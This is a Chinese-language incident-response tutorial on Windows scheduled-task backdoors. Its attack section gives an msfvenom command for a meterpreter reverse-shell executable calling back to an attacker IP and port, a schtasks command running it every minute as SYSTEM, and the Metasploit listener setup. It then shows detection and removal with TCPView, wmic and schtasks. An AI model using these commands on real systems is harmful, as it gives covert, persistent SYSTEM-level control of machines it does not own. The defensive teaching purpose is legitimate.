## 二、计划任务后门原理概述

**计划任务后门**是 Windows 环境中极为常见的一种权限维持手段，其核心思想是：

> 利用 Windows 任务计划程序（Task Scheduler），定时或触发执行恶意程序，实现持续控制。

### 特点

| 特点 | 说明 |
|------|------|
| 隐蔽性强 | 不依赖自启动项 |
| 稳定性高 | 系统原生机制 |
| 不易发现 | 不易被一次性排查发现 |

## 三、攻击实战：创建计划任务后门

⚠️ **本节用于理解攻击原理，仅用于应急响应与防御研究**

### 3.1 生成后门程序

使用 MSF 生成反弹 shell 的 Windows 可执行文件：

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
lhost=198.168.1.9  \
lport=8888 \
-f exe -o 0xSec.exe
```

**参数说明：**
| 参数 | 说明 |
|------|------|
| `lhost` | 攻击者监听主机 IP |
| `lport` | 攻击者监听端口 |
| `0xSec.exe` | 生成的后门程序 |

### 3.2 创建计划任务

将后门程序上传至目标服务器后，执行以下命令创建计划任务：

```cmd
schtasks /create /tn 0xSec /sc minute /mo 1 ^
/tr C:\Users\Administrator\Desktop\0xSec.exe ^
/ru system /f
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `/tn 0xSec` | 任务名 |
| `/sc minute /mo 1` | 每 1 分钟执行一次 |
| `/tr` | 执行的程序路径 |
| `/ru system` | 以 SYSTEM 权限运行 |
| `/f` | 强制创建 |

**结果：** 此时后门已具备 **SYSTEM 权限 + 定时执行能力**

### 3.3 监听反弹 Shell

攻击者本地 MSF 监听：

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 198.168.1.9
set lport 8888
exploit
```

一分钟后，目标主机会主动回连，权限维持成功。

## 四、应急响应：如何发现计划任务后门

### 4.1 网络层异常发现（TCPView）

**工具下载地址：** https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview

#### 为什么不用 netstat -ano？

| 原因 | 说明 |
|------|------|
| 计划任务是**周期性执行** | 不是持续连接 |
| `netstat` 只能看到**当前瞬时连接** | 很容易错过异常行为 |

#### 使用 TCPView 进行排查

TCPView 可实时展示：
- 进程名
- PID
- 本地 / 远程 IP + 端口
- 连接状态（颜色变化）

#### 发现异常现象

| 特征 | 示例值 |
|------|--------|
| 进程名 | `0xSec.exe` |
| 远程地址 | `198.168.1.9:8888` |
| 连接状态 | **红绿交替（周期性）** |
| PID | 184192 |

#### 根据 PID 定位文件路径

```cmd
wmic process get name,executablepath,processid | findstr 184192
```

**输出示例：**
```
C:\Users\Administrator\Desktop\0xSec.exe         0xSec.exe        184192
```

## 五、计划任务排查命令汇总

### 5.1 查看所有计划任务

```cmd
schtasks /query /fo LIST /v
```

### 5.2 查找可疑计划任务

```cmd
schtasks /query /fo LIST | findstr /i "0xSec"
```

### 5.3 删除可疑计划任务

```cmd
schtasks /delete /tn "0xSec" /f
```

### 5.4 查看计划任务详细配置

```cmd
schtasks /query /tn "0xSec" /v
```
